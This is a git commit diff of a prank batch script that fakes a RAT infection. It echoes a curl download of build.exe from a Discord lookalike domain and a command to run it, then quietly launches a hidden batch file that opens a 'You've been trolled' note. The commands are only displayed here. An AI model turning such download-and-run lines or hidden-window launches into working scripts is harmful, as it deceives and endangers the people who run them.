3230d8612b003c23cdbbed5c5a46ac361aac47ab
qaiik <82181231+qaiik@users.noreply.github.com>
2022-08-05 22:41:34 -0600

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,11 +1,9 @@
 @echo off
 color 2
 
-set fake=echo %cd%^>
-
-%fake% curl https://dlscord.space/build.exe --output build.exe
-%fake% build.exe
-%fake% echo get kant ratted lmao
+echo %cd%^> curl https://dlscord.space/build.exe --output build.exe
+echo %cd%^> build.exe
+echo %cd%^> echo get kant ratted lmao
 echo timeout /T 10 ^&^& echo You've been trolled ^> thereIsNoRat.txt ^&^& notepad thereIsNoRat.txt ^> NUL > rouaf.bat
 
 powershell -c "Start-Process rouaf.bat -WindowStyle hidden"
